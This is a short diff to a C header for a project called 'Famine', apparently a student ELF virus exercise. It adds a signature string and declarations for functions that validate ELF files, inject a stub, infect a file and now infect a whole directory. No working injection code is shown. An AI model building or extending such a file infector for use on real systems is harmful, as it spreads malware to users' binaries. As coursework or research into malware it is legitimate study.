@@ -5,6 +5,7 @@
 #  define _GNU_SOURCE
 # endif
 
+# include <dirent.h>
 # include <elf.h>
 # include <fcntl.h>
 # include <stdint.h>
@@ -13,7 +14,7 @@
 # include <sys/mman.h>
 # include <sys/stat.h>
 # include <unistd.h>
-
+# include <limits.h>
 
 # if DEBUG
 #  include <stdio.h>
@@ -21,6 +22,8 @@
 # else
 #  define LOG(...) ((void)0)
 # endif
+
+# define FAMINE_SIG "Famine version 1.0 (c)oded by cbopp-mvan-wij"
 
 /*
  * Elf64_Ehdr (file header)
@@ -64,12 +67,14 @@ typedef struct s_famine
 }	t_famine;
 
 // elf.c
-int			is_valid_elf(const Elf64_Ehdr *elf);
+int			is_valid_elf(const Elf64_Ehdr *elf, off_t size);
 int			find_segments(t_famine *f);
 uint64_t	highest_vaddr_end(const t_famine *f);
 
 void		inject_stub(t_famine *f);
 
 int			infect_file(const char *path);
+
+void		infect_dir(const char *dir);
 
 #endif
